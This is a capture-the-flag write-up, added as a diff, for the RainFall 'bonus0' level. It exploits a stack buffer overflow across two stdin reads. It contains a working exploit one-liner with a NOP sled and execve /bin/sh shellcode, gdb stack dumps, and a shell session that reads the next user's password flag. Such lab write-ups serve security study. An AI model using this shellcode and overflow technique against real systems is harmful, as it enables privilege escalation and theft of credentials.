@@ -1,0 +1,56 @@
+The program read two times from the stdin using Read, i found the seg fault after 20 char per line.
+
+-
+12345678901234567890
+-
+123456789AAAA1234567
+
+the AAAA will overrride eip address.
+
+to write to the seconde read i need to all the buffer which is 4096, and also i will store the shellcode there then redirect the execution to it after.
+
+python -c "print('\x90'*177+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+'A'*3890+'\n'+'123456789\xb0\xe6\xff\xbf1234567')" > pl
+
+(gdb) r < pl
+Starting program: /home/user/bonus0/bonus0 < pl
+
+(gdb) x/128wx 0xbfffe650
+0xbfffe650:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffe660:	0x90909090	0x90909090	0x90909090	0x90909090
+…
+0xbfffe6f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffe700:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
+0xbfffe710:	0xc289c189	0x80cd0bb0	0xcd40c031	0x41414180
+0xbfffe720:	0x41414141	0x41414141	0x41414141	0x41414141
+…
+
+(gdb) c
+Continuing.
+ -
+
+Breakpoint 1, 0x080484f7 in p ()
+(gdb) x/128wx 0xbfffe650
+0xbfffe650:	0x34333231	0x38373635	0xffe67039	0x333231bf
+0xbfffe660:	0x37363534	0x9090900a	0x90909090	0x90909090
+0xbfffe670:	0x90909090	0x90909090	0x90909090	0x90909090
+…
+0xbfffe6f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffe700:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
+0xbfffe710:	0xc289c189	0x80cd0bb0	0xcd40c031	0x41414180
+0xbfffe720:	0x41414141	0x41414141	0x41414141	0x41414141
+…
+
+since the second part is short. data from read one stay in the stack.
+
+bonus0@RainFall:~$ python -c "print('\x90'*177+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+'A'*3890+'\n'+'123456789\xb0\xe6\xff\xbf1234567')" > pl
+bonus0@RainFall:~$ cat pl - | ./bonus0
+ -
+ -
+��������������������123456789����1234567�� 123456789����1234567��
+whoami
+bonus1
+pwd
+/home/user/bonus0
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
